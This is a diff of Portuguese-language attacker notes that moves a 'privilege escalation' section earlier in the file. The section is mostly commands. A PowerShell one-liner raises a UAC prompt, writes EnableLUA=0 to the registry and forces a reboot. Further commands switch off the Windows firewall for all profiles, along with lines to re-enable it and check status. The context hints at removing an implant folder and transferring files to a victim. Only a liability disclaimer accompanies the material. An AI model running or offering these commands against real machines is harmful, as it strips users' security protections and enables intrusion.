@@ -67,6 +67,41 @@ rmdir /s /q "%USERPROFILE%\WindowsAudio"
 
 ---
 
+### 5. Elevação de Privilégio (Desabilitar UAC)
+
+⚠️ **Aviso** O uso indevido é de total responsabilidade do usuário.
+
+**Atenção:** Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.
+
+```bash
+# Desabilita o UAC e reinicia o sistema imediatamente:
+powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"
+
+O que acontece:
+Abre um pop-up do UAC solicitando permissão administrativa
+Se o usuário clicar em "Sim", desabilita o UAC no registro
+Reinicia o sistema automaticamente na hora
+Após o reboot, qualquer shell terá privilégios administrativos totais
+
+# Para reabilitar o UAC:
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f && shutdown /r /t 0
+
+# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
+netsh advfirewall set allprofiles state off
+
+# Para reabilitar firewall:
+netsh advfirewall set allprofiles state on
+
+# Verificar status do firewall:
+netsh advfirewall show allprofiles
+
+# Verificar se tem privilégios administrativos
+whoami /groups | findstr "Administradores"
+# Se aparecer "BUILTIN\Administradores - Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo"
+# indica Admin completo (UAC desabilitado).
+
+---
+
 ## 📡 Transferir arquivos
 
 ### Enviar arquivo do Linux para o Windows
@@ -198,37 +233,3 @@ Execute:
 ```bash
 python3 decode_users_pass.py
 ```
-
-### 5. Elevação de Privilégio (Desabilitar UAC)
-
-⚠️ **Aviso** O uso indevido é de total responsabilidade do usuário.
-
-**Atenção:** Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.
-
-```cmd
-# Desabilita o UAC e reinicia o sistema imediatamente:
-powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"
----
-
-O que acontece:
-Abre um pop-up do UAC solicitando permissão administrativa
-Se o usuário clicar em "Sim", desabilita o UAC no registro
-Reinicia o sistema automaticamente na hora
-Após o reboot, qualquer shell terá privilégios administrativos totais
-
-# Para reabilitar o UAC:
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f && shutdown /r /t 0
-
-# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
-netsh advfirewall set allprofiles state off
-
-# Para reabilitar firewall:
-netsh advfirewall set allprofiles state on
-
-# Verificar status do firewall:
-netsh advfirewall show allprofiles
-
-# Verificar se tem privilégios administrativos
-whoami /groups | findstr "Administradores"
-# Se aparecer "BUILTIN\Administradores - Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo"
-# indica Admin completo (UAC desabilitado).
